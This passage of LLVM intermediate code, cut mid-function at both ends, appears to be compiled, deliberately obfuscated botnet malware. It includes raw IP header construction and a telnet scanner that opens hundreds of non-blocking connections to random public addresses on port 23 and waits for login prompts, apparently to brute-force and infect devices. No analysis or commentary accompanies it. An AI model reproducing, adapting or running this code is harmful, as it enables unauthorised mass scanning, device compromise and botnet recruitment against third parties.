  %43 = or i8 %41, %42
  %44 = or i8 %39, 64
  store i8 %43, i8* %35, align 4
  %45 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 1
  store i8 0, i8* %46, align 1
  %47 = load i32, i32* %10, align 4
  %48 = sext i32 %47 to i64
  %49 = sub i64 0, 20
  %50 = sub i64 0, %48
  %51 = add i64 %49, %50
  %52 = sub i64 0, %51
  %53 = add i64 20, %48
  %54 = trunc i64 %52 to i16
  %55 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 2
  store i16 %54, i16* %56, align 2
  %57 = call i32 @rand_cmwc()
  %58 = trunc i32 %57 to i16
  %59 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 3
  store i16 %58, i16* %60, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 4
  store i16 0, i16* %62, align 2
  %63 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %64 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %63, i32 0, i32 5
  store i8 -1, i8* %64, align 4
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 6
  store i8 %65, i8* %67, align 1
  %68 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 7
  store i16 0, i16* %69, align 2
  %70 = load i32, i32* %8, align 4
  %71 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  store i32 %70, i32* %72, align 4
  %73 = load i32, i32* %7, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 9
  store i32 %73, i32* %75, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %61

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = sub i32 0, 1
  %59 = sub i32 %57, %58
  %60 = add nsw i32 %57, 1
  store i32 %59, i32* %2, align 4
  br label %37

; <label>:61:                                     ; preds = %37
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

; <label>:64:                                     ; preds = %2100, %61
  br label %65

; <label>:65:                                     ; preds = %64
  store i32 0, i32* %2, align 4
  br label %66

; <label>:66:                                     ; preds = %2093, %65
  %67 = load i32, i32* %2, align 4
  %68 = load i32, i32* %1, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %2100

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  switch i32 %76, label %2092 [
    i32 0, label %77
    i32 1, label %229
    i32 2, label %408
    i32 3, label %700
    i32 4, label %768
    i32 5, label %1115
    i32 6, label %1183
    i32 7, label %1994
    i32 8, label %2022
  ]

; <label>:77:                                     ; preds = %70
  %78 = load i32, i32* %2, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 8
  %82 = load i8*, i8** %81, align 8
  call void @llvm.memset.p0i8.i64(i8* %82, i8 0, i64 1024, i32 1, i1 false)
  %83 = load i32, i32* %2, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 3
  %87 = load i8, i8* %86, align 1
  %88 = icmp ne i8 %87, 0
  br i1 %88, label %89, label %109

; <label>:89:                                     ; preds = %77
  %90 = load i32, i32* %2, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 8
  %94 = load i8*, i8** %93, align 8
  store i8* %94, i8** %11, align 8
  %95 = load i32, i32* %2, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %96
  %98 = bitcast %struct.telstate_t* %97 to i8*
  call void @llvm.memset.p0i8.i64(i8* %98, i8 0, i64 32, i32 16, i1 false)
  %99 = load i8*, i8** %11, align 8
  %100 = load i32, i32* %2, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 8
  store i8* %99, i8** %103, align 8
  %104 = call i32 @getRandomPublicIP()
  %105 = load i32, i32* %2, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 1
  store i32 %104, i32* %108, align 4
  br label %154

; <label>:109:                                    ; preds = %77
  %110 = load i32, i32* %2, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 5
  %114 = load i8, i8* %113, align 1
  %115 = add i8 %114, -126
  %116 = add i8 %115, 1
  %117 = sub i8 %116, -126
  %118 = add i8 %114, 1
  store i8 %117, i8* %113, align 1
  %119 = load i32, i32* %2, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %120
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %121, i32 0, i32 5
  %123 = load i8, i8* %122, align 1
  %124 = zext i8 %123 to i64
  %125 = icmp eq i64 %124, 18
  br i1 %125, label %126, label %140

; <label>:126:                                    ; preds = %109
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 5
  store i8 0, i8* %130, align 1
  %131 = load i32, i32* %2, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 4
  %135 = load i8, i8* %134, align 2
  %136 = sub i8 %135, -38
  %137 = add i8 %136, 1
  %138 = add i8 %137, -38
  %139 = add i8 %135, 1
  store i8 %138, i8* %134, align 2
  br label %140

; <label>:140:                                    ; preds = %126, %109
  %141 = load i32, i32* %2, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 4
  %145 = load i8, i8* %144, align 2
  %146 = zext i8 %145 to i64
  %147 = icmp eq i64 %146, 10
  br i1 %147, label %148, label %153

; <label>:148:                                    ; preds = %140
  %149 = load i32, i32* %2, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 3
  store i8 1, i8* %152, align 1
  br label %2093

; <label>:153:                                    ; preds = %140
  br label %154

; <label>:154:                                    ; preds = %153, %89
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %155, align 4
  %156 = call zeroext i16 @htons(i16 zeroext 23) #13
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %159 = getelementptr inbounds [8 x i8], [8 x i8]* %158, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %159, i8 0, i64 8, i32 4, i1 false)
  %160 = load i32, i32* %2, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 1
  %164 = load i32, i32* %163, align 4
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %166 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %165, i32 0, i32 0
  store i32 %164, i32* %166, align 4
  %167 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %168 = load i32, i32* %2, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 0
  store i32 %167, i32* %171, align 16
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = icmp eq i32 %176, -1
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %154
  br label %2093

; <label>:179:                                    ; preds = %154
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = load i32, i32* %2, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 16
  %190 = call i32 (i32, i32, ...) @fcntl(i32 %189, i32 3, i8* null)
  %191 = and i32 %190, 2048
  %192 = xor i32 %190, 2048
  %193 = or i32 %191, %192
  %194 = or i32 %190, 2048
  %195 = call i32 (i32, i32, ...) @fcntl(i32 %184, i32 4, i32 %193)
  %196 = load i32, i32* %2, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 0
  %200 = load i32, i32* %199, align 16
  %201 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %202 = call i32 @connect(i32 %200, %struct.sockaddr* %201, i32 16)
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %204, label %219

; <label>:204:                                    ; preds = %179
  %205 = call i32* @__errno_location() #13
  %206 = load i32, i32* %205, align 4
  %207 = icmp ne i32 %206, 115
  br i1 %207, label %208, label %219

; <label>:208:                                    ; preds = %204
  %209 = load i32, i32* %2, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = call i32 @sclose(i32 %213)
  %215 = load i32, i32* %2, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 3
  store i8 1, i8* %218, align 1
  br label %228

; <label>:219:                                    ; preds = %204, %179
  %220 = load i32, i32* %2, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 2
  store i8 1, i8* %223, align 8
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 6
  store i32 0, i32* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %219, %208
  br label %2092

; <label>:229:                                    ; preds = %70
  %230 = load i32, i32* %2, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 6
  %234 = load i32, i32* %233, align 4
  %235 = icmp eq i32 %234, 0
  br i1 %235, label %236, label %242

; <label>:236:                                    ; preds = %229
  %237 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %238 = load i32, i32* %2, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %239
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %240, i32 0, i32 6
  store i32 %237, i32* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %236, %229
  br label %243

; <label>:243:                                    ; preds = %242
  %244 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %245 = getelementptr inbounds [16 x i64], [16 x i64]* %244, i64 0, i64 0
  %246 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %245) #2, !srcloc !5
  %247 = extractvalue { i64, i64* } %246, 0
  %248 = extractvalue { i64, i64* } %246, 1
  %249 = trunc i64 %247 to i32
  store i32 %249, i32* %12, align 4
  %250 = ptrtoint i64* %248 to i64
  %251 = trunc i64 %250 to i32
  store i32 %251, i32* %13, align 4
  br label %252

; <label>:252:                                    ; preds = %243
  br label %253

; <label>:253:                                    ; preds = %252
  %254 = load i32, i32* %2, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %255
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 16
  %259 = srem i32 %258, 64
  %260 = zext i32 %259 to i64
  %261 = shl i64 1, %260
  %262 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %263 = load i32, i32* %2, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %264
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %265, i32 0, i32 0
  %267 = load i32, i32* %266, align 16
  %268 = sdiv i32 %267, 64
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds [16 x i64], [16 x i64]* %262, i64 0, i64 %269
  %271 = load i64, i64* %270, align 8
  %272 = xor i64 %271, -1
  %273 = xor i64 %261, -1
  %274 = xor i64 1886085705513807792, -1
  %275 = and i64 %272, 1886085705513807792
  %276 = and i64 %271, %274
  %277 = and i64 %273, 1886085705513807792
  %278 = and i64 %261, %274
  %279 = or i64 %275, %276
  %280 = or i64 %277, %278
  %281 = xor i64 %279, %280
  %282 = or i64 %272, %273
  %283 = xor i64 %282, -1
  %284 = or i64 1886085705513807792, %274
  %285 = and i64 %283, %284
  %286 = or i64 %281, %285
  %287 = or i64 %271, %261
  store i64 %286, i64* %270, align 8
  %288 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %288, align 8
  %289 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %289, align 8
  %290 = load i32, i32* %2, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 16
  %295 = sub i32 0, 1
  %296 = sub i32 %294, %295
  %297 = add nsw i32 %294, 1
  %298 = call i32 @select(i32 %296, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %298, i32* %3, align 4
  %299 = load i32, i32* %3, align 4
  %300 = icmp eq i32 %299, 1
  br i1 %300, label %301, label %361

; <label>:301:                                    ; preds = %253
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %302 = load i32, i32* %2, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %303
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %304, i32 0, i32 0
  %306 = load i32, i32* %305, align 16
  %307 = bitcast i32* %7 to i8*
  %308 = call i32 @getsockopt(i32 %306, i32 1, i32 4, i8* %307, i32* %6) #2
  %309 = load i32, i32* %7, align 4
  %310 = icmp ne i32 %309, 0
  br i1 %310, label %311, label %326

; <label>:311:                                    ; preds = %301
  %312 = load i32, i32* %2, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %313
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %314, i32 0, i32 0
  %316 = load i32, i32* %315, align 16
  %317 = call i32 @sclose(i32 %316)
  %318 = load i32, i32* %2, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %319
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %320, i32 0, i32 2
  store i8 0, i8* %321, align 8
  %322 = load i32, i32* %2, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 3
  store i8 1, i8* %325, align 1
  br label %360

; <label>:326:                                    ; preds = %301
  %327 = load i32, i32* %2, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 16
  %332 = load i32, i32* %2, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 0
  %336 = load i32, i32* %335, align 16
  %337 = call i32 (i32, i32, ...) @fcntl(i32 %336, i32 3, i8* null)
  %338 = xor i32 -2049, -1
  %339 = xor i32 %337, %338
  %340 = and i32 %339, %337
  %341 = and i32 %337, -2049
  %342 = call i32 (i32, i32, ...) @fcntl(i32 %331, i32 4, i32 %340)
  %343 = load i32, i32* %2, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 6
  store i32 0, i32* %346, align 4
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 7
  store i16 0, i16* %350, align 16
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 8
  %355 = load i8*, i8** %354, align 8
  call void @llvm.memset.p0i8.i64(i8* %355, i8 0, i64 1024, i32 1, i1 false)
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 2
  store i8 2, i8* %359, align 8
  br label %2093

; <label>:360:                                    ; preds = %311
  br label %380

; <label>:361:                                    ; preds = %253
  %362 = load i32, i32* %3, align 4
  %363 = icmp eq i32 %362, -1
  br i1 %363, label %364, label %379

; <label>:364:                                    ; preds = %361
  %365 = load i32, i32* %2, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 0
  %369 = load i32, i32* %368, align 16
  %370 = call i32 @sclose(i32 %369)
  %371 = load i32, i32* %2, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %372
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %373, i32 0, i32 2
  store i8 0, i8* %374, align 8
  %375 = load i32, i32* %2, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 3
  store i8 1, i8* %378, align 1
  br label %379

; <label>:379:                                    ; preds = %364, %361
  br label %380

; <label>:380:                                    ; preds = %379, %360
  %381 = load i32, i32* %2, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 6
  %385 = load i32, i32* %384, align 4
  %386 = sub i32 %385, -1255707367
  %387 = add i32 %386, 10
  %388 = add i32 %387, -1255707367
  %389 = add i32 %385, 10
  %390 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %391 = icmp ult i32 %388, %390
  br i1 %391, label %392, label %407

; <label>:392:                                    ; preds = %380
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 0
  %397 = load i32, i32* %396, align 16
  %398 = call i32 @sclose(i32 %397)
  %399 = load i32, i32* %2, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 2
  store i8 0, i8* %402, align 8
  %403 = load i32, i32* %2, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 3
  store i8 1, i8* %406, align 1
  br label %407

; <label>:407:                                    ; preds = %392, %380
  br label %2092

; <label>:408:                                    ; preds = %70
  %409 = load i32, i32* %2, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 6
  %413 = load i32, i32* %412, align 4
  %414 = icmp eq i32 %413, 0
  br i1 %414, label %415, label %421

; <label>:415:                                    ; preds = %408
  %416 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 6
  store i32 %416, i32* %420, align 4
  br label %421

; <label>:421:                                    ; preds = %415, %408
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 16
  %427 = load i32, i32* %2, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 8
  %431 = load i8*, i8** %430, align 8
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 7
  %436 = load i16, i16* %435, align 16
  %437 = zext i16 %436 to i32
  %438 = call i32 @readUntil(i32 %426, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %431, i32 1024, i32 %437)
  %439 = icmp ne i32 %438, 0
